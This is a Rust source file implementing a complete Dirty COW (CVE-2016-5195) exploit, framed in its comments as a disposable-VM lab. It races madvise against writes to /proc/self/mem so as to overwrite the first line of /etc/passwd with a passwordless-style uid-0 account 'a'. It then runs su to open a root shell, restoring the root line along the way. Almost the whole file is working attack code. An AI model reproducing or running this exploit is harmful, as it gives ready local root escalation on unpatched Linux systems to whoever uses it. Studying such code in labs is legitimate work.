use std::fs::OpenOptions;
use std::io::{Read, Seek, SeekFrom, Write, BufRead, BufReader};
use std::os::unix::io::AsRawFd;
use std::process::Command;
use std::ptr;
use std::sync::{atomic::{AtomicBool, AtomicU64, Ordering}, Arc};
use std::thread;
use std::time::{Duration, Instant};

fn main() -> std::io::Result<()> {
    // -------------------------------------------------------------------------
    // Research context
    // -------------------------------------------------------------------------
    // This binary is part of a controlled Dirty COW / CVE-2016-5195 lab.
    //
    // The purpose is to understand how a kernel copy-on-write race can turn a
    // read-only file mapping into an unintended write primitive. This is not
    // intended for use against real systems. It belongs in a disposable VM with
    // backups, where breaking and repairing the box is part of the learning.
    //
    // The central lesson we built toward is this:
    //
    //   Dirty COW does not magically give a root shell.
    //   Dirty COW gives an unauthorized write primitive.
    //   Privilege escalation depends on choosing a precise write target.

    let target_path = "/etc/passwd";

    // -------------------------------------------------------------------------
    // Configuration: deliberately tiny credentials
    // -------------------------------------------------------------------------
    // /etc/passwd is line-oriented and Dirty COW is an overwrite, not an insert.
    // A one-character username gives the payload the best chance of
    // fitting cleanly without corrupting the second line.
    let login_name = "a";

    // Traditional DES crypt hash for password "a" with salt "aa".
    // Verified via: python3 -c 'import crypt; print(crypt.crypt("a", "aa"))'
    let passwd_hash = "aa8B39889B99.";

    // -------------------------------------------------------------------------
    // 1. Measure target geometry
    // -------------------------------------------------------------------------
    // Before racing, we read the first line and treat its exact byte length
    // as a hard boundary to prevent "line bleed" into the daemon user.
    let f = OpenOptions::new().read(true).open(target_path)?;
    let mut first_line = String::new();
    let mut reader = BufReader::new(&f);
    reader.read_line(&mut first_line)?;

    let target_len = first_line.len();

    println!("[*] Original first line: {}", first_line.trim_end());
    println!("[*] Target line geometry: {} bytes", target_len);

    // -------------------------------------------------------------------------
    // 2. Build a same-length passwd payload
    // -------------------------------------------------------------------------
    let base_payload = format!("{login_name}:{passwd_hash}:0:0::/:/bin/sh");

    if base_payload.len() > target_len - 1 {
        eprintln!("[-] Fatal: Payload exceeds target line length. Aborting.");
        return Ok(());
    }

    let parts: Vec<&str> = base_payload.split(':').collect();
    if parts.len() != 7 {
        eprintln!("[-] Internal payload error: expected 7 fields, got {}", parts.len());
        return Ok(());
    }

    // Padding belongs in the GECOS/comment field to absorb filler
    // without altering critical home/shell fields.
    let mut padded_payload = format!("{}:{}:{}:{}:", parts[0], parts[1], parts[2], parts[3]);
    let padding_needed = (target_len - 1) - base_payload.len();
    for _ in 0..padding_needed {
        padded_payload.push('x');
    }

    padded_payload.push_str(&format!("{}:{}:{}", parts[4], parts[5], parts[6]));
    padded_payload.push('\n');

    // -------------------------------------------------------------------------
    // 3. Own the payload bytes for thread safety
    // -------------------------------------------------------------------------
    let final_payload: Vec<u8> = padded_payload.into_bytes();
    let len = final_payload.len();

    if len != target_len {
        eprintln!("[-] Geometry Mismatch: Payload {} != Target {}. Refusing to run.", len, target_len);
        return Ok(());
    }

    // -------------------------------------------------------------------------
    // 4. Map the target read-only and private
    // -------------------------------------------------------------------------
    let file = OpenOptions::new().read(true).open(target_path)?;
    let map = unsafe {
        libc::mmap(ptr::null_mut(), 4096, libc::PROT_READ, libc::MAP_PRIVATE, file.as_raw_fd(), 0)
    };

    if map == libc::MAP_FAILED {
        return Err(std::io::Error::last_os_error());
    }

    // -------------------------------------------------------------------------
    // 5. Race control and instrumentation
    // -------------------------------------------------------------------------
    // `running` uses SeqCst ordering to ensure both threads see the kill-switch
    // immediately upon success, preventing runaway writes.
    let running = Arc::new(AtomicBool::new(true));
    let mad_count = Arc::new(AtomicU64::new(0));
    let wr_count = Arc::new(AtomicU64::new(0));

    let r_mad = running.clone();
    let c_mad = mad_count.clone();
    let map_usize = map as usize;

    // Thread A: madvise pressure.
    let mad_thread = thread::spawn(move || {
        let map_ptr = map_usize as *mut libc::c_void;
        while r_mad.load(Ordering::SeqCst) {
            unsafe { libc::madvise(map_ptr, 4096, libc::MADV_DONTNEED); }
            let count = c_mad.fetch_add(1, Ordering::Relaxed) + 1;
            thread::yield_now();

            // Stability: Micro-sleeps prevent kernel panics by allowing
            // internal housekeeping to catch up.
            if count % 50 == 0 {
                thread::sleep(Duration::from_micros(100));
            }
        }
    });

    // Thread B: writer pressure.
    let r_write = running.clone();
    let c_write = wr_count.clone();
    let writer_payload = final_payload.clone();

    let write_thread = thread::spawn(move || {
        let mut mem_file = OpenOptions::new().read(true).write(true)
            .open("/proc/self/mem").expect("Failed to open /proc/self/mem");
        while r_write.load(Ordering::SeqCst) {
            let _ = mem_file.seek(SeekFrom::Start(map_usize as u64));
            let _ = mem_file.write_all(&writer_payload);
            c_write.fetch_add(1, Ordering::Relaxed);
            thread::yield_now();
            thread::sleep(Duration::from_micros(100));
        }
    });

    // -------------------------------------------------------------------------
    // 6. Success fuse
    // -------------------------------------------------------------------------
    let mut success = false;
    println!("[*] Race active (3s timeout, gentler loop timing)...");
    let start = Instant::now();

    loop {
        if let Ok(mut check_file) = OpenOptions::new().read(true).open(target_path) {
            let mut check_buf = vec![0u8; len];
            if check_file.read_exact(&mut check_buf).is_ok() && check_buf == final_payload {
                running.store(false, Ordering::SeqCst);
                success = true;
                println!("[+] SUCCESS: Race won and verified!");
                break;
            }
        }

        if start.elapsed() > Duration::from_secs(3) {
            running.store(false, Ordering::SeqCst);
            println!("[-] Timeout: Exploitation window closed.");
            break;
        }
        thread::sleep(Duration::from_millis(1));
    }

    let _ = mad_thread.join();
    let _ = write_thread.join();
    unsafe { libc::munmap(map, 4096); }

    // -------------------------------------------------------------------------
    // 7. Escalation proof and cleanup
    // -------------------------------------------------------------------------
    if success {
        unsafe { libc::sync(); }
        // Pause gives the filesystem path a moment to settle before su.
        thread::sleep(Duration::from_secs(1));

        if let Ok(mut proof_file) = OpenOptions::new().read(true).open(target_path) {
            let mut proof = String::new();
            let _ = proof_file.read_to_string(&mut proof);
            if let Some(line) = proof.lines().next() {
                println!("[*] Verification - New first line: {}", line);
            }
        }

        println!("[*] Escalating as '{}'. PW: a", login_name);

        let restore_and_shell = concat!(
        "cp /etc/passwd /tmp/passwd.dirty.bak; ",
        "sed -i '1c\\root:x:0:0:root:/root:/bin/bash' /etc/passwd; ",
        "sync; ",
        "echo \"[*] Root restored. First line:\"; ",
        "head -n 1 /etc/passwd; ",
        "id; ",
        "exec /bin/sh"
        );

        let status = Command::new("su")
            .arg("-c").arg(restore_and_shell).arg(login_name)
            .spawn()?.wait()?;

        if !status.success() {
            eprintln!("[-] su failed. The write may have landed, but auth failed.");
        }
    } else {
        println!("[*] No escalation attempted: race did not land.");
    }

    Ok(())
}